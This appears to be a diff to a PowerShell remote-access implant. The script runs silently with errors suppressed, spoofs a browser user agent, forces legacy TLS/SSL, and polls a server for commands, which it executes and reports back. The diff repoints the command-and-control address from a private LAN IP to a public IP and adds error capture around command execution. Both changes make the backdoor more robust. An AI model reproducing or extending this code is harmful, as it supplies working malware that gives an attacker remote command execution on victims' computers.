@@ -1,7 +1,7 @@
 
 $ErrorActionPreference= 'silentlycontinue'
 
-$SERVER_URL = "http://192.168.1.2/nopo/"
+$SERVER_URL = "http://172.86.75.106/"
 $UAG='Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3
 [Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"
@@ -114,14 +114,25 @@ while ($true) {
         if ($REQ -ne "wait") {
 
             $JSON = $REQ | ConvertFrom-Json
-            $MODE = $JSON.json
+           
         
             $CMD = $JSON.cmd
-            $RUN = RunCommand $CMD
+       
 
-            if ($RUN -eq "" -or $RUN -eq $null) {
-                        $RUN = "No Result"
+                    try {
+                        $RUN = RunCommand $CMD
+                             if ($RUN -eq "" -or $RUN -eq $null) {
+                $RUN = "No Result"
+            }
                     }
+                    catch {
+                        $RUN = $_.Exception.Message
+                    }
+
+
+
+
+
             
             
          
